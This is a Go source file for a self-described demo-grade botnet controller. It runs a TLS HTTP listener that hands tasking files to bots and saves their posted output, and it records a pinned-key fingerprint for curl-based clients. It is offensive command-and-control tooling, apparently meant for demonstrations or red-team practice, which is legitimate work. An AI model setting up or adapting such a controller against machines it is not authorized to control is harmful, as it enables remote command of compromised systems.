// Program demobotnetcontroller - Demo-grade botnet controller
package main

/*
 * demobotnetcontroller.go
 * Demo-grade botnet controller
 * By J. Stuart McMurray
 * Created 20251029
 * Last Modified 20251101
 */

import (
	"context"
	"errors"
	"flag"
	"fmt"
	"log/slog"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"
	"time"

	"github.com/magisterquis/curlrevshell/lib/ctxerrgroup"
	"github.com/magisterquis/curlrevshell/lib/pledgeunveil"
	"github.com/magisterquis/curlrevshell/lib/sstls"
	"github.com/magisterquis/demobotnetcontroller/internal/server"
)

const (
	// fingerprintFile is the file to which we save the listener's pubkey
	// fingerprint, suitable for passing to curl's --pinnedpubkey.
	fingerprintFile = "_tls_fingerprint"
)

func main() {
	/* Command-line flags. */
	var (
		lAddr = flag.String(
			"listen",
			"0.0.0.0:4433",
			"Listen `address`",
		)
		debug = flag.Bool(
			"debug",
			false,
			"Enable debug logging",
		)
		dir = flag.String(
			"dir",
			"demobotnet",
			"Bot tasking/output `directory`",
		)
		maxRuntime = flag.Duration(
			"max-runtime",
			0,
			"Maximum run `duration`",
		)
		botPrefix = flag.String(
			"prefix",
			"/bots",
			"HTTP URL path prefix for bots",
		)
		requestTimeout = flag.Duration(
			"request-timeout",
			time.Minute,
			"Per-request `timeout`",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %s [options]

Demo-grade botnet controller.

- Comms over HTTP, GET for tasking, POST/PUT for output.
- URL path must have the right prefix, last component is bot ID.
- IDs must be [A-Za-z0-9-.]+
- Tasking goes into files named after the bots' IDs plus _task.
- Output will go to files named after the bots' IDs.
- TLS Fingerprint (for --pinnedpubkey) is in _tls_fingerprint.

Options:
`,
			filepath.Base(os.Args[0]),
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	pledgeunveil.MustPledge("cpath fattr inet rpath stdio unveil wpath")

	/* Don't run too long (maybe) */
	ctx := context.Background()
	if 0 != *maxRuntime {
		var cancel func()
		ctx, cancel = context.WithTimeout(ctx, *maxRuntime)
		defer cancel()
	}

	/* Work out logging. */
	lv := slog.LevelInfo
	if *debug {
		lv = slog.LevelDebug
	}
	sl := slog.New(slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{
		Level: lv,
	}))

	/* Set up our directories. */
	if err := os.MkdirAll(*dir, 0770); nil != err {
		sl.Error(
			"Failed to make tasking/output directory",
			"path", *dir,
			"error", err,
		)
		os.Exit(10)
	}
	dcf := sstls.DefaultCertFile()
	dn := filepath.Dir(dcf)
	if err := os.MkdirAll(dn, 0700); nil != err {
		sl.Error(
			"Failed to make TLS cache directory",
			"path", dn,
			"error", err,
		)
		os.Exit(11)
	}
	if err := pledgeunveil.MultiUnveil([][2]string{
		{dcf, "rwc"},
		{*dir, "rwc"},
	}); nil != err {
		sl.Error("Failed to unveil(2)", "error", err)
		os.Exit(12)
	}
	root, err := os.OpenRoot(*dir)
	if nil != err {
		sl.Error(
			"Failed to open tasking/output directory",
			"path", *dir,
			"error", err,
		)
		os.Exit(13)
	}

	pledgeunveil.MustPledge("cpath fattr inet rpath stdio wpath")

	/* Start the listener listening and save our fingerprint. */
	l, err := sstls.Listen(
		"tcp",
		*lAddr,
		"",
		0,
		sstls.DefaultCertFile(),
	)
	if nil != err {
		sl.Error(
			"Failed to start listener",
			"address", *lAddr,
			"error", err,
		)
		os.Exit(14)
	}
	if err := root.WriteFile(
		fingerprintFile,
		[]byte(l.Fingerprint+"\n"),
		0660,
	); nil != err {
		sl.Error(
			"Failed to save fingerprint",
			"filename", fingerprintFile,
			"fingerprint", l.Fingerprint,
			"error", err,
		)
		os.Exit(15)
	}

	/* Start the server and a Ctrl+C watcher. */
	prefix := server.CleanPrefix(*botPrefix)
	errInterrupt := errors.New("got interrupt")
	eg, ctx := ctxerrgroup.WithContext(ctx)
	sl.Info(
		"Server starting",
		"fingerprint", l.Fingerprint,
		"address", l.Addr().String(),
		"PID", os.Getpid(),
		"directory", root.Name(),
		"prefix", prefix,
	)
	eg.GoContext(ctx, func(ctx context.Context) error {
		return server.Serve(ctx, sl, l, prefix, root, *requestTimeout)
	})
	eg.GoContext(ctx, func(ctx context.Context) error {
		sigs := []os.Signal{os.Interrupt, syscall.SIGTERM}
		ch := make(chan os.Signal, 1)
		signal.Notify(ch, sigs...)
		defer signal.Reset(sigs...)
		select {
		case s := <-ch:
			sl.Info("Got signal", "signal", s)
			return errInterrupt
		case <-ctx.Done():
			return nil
		}
	})

	if err := eg.Wait(); nil == err && errors.Is(
		context.Cause(ctx),
		context.DeadlineExceeded,
	) {
		sl.Info("Max runtime reached")
		return
	} else if errors.Is(err, errInterrupt) {
		return
	} else if nil != err {
		sl.Error(
			"Fatal error",
			"error", err,
		)
		os.Exit(16)
	}
	sl.Info("Goodbye.")
}
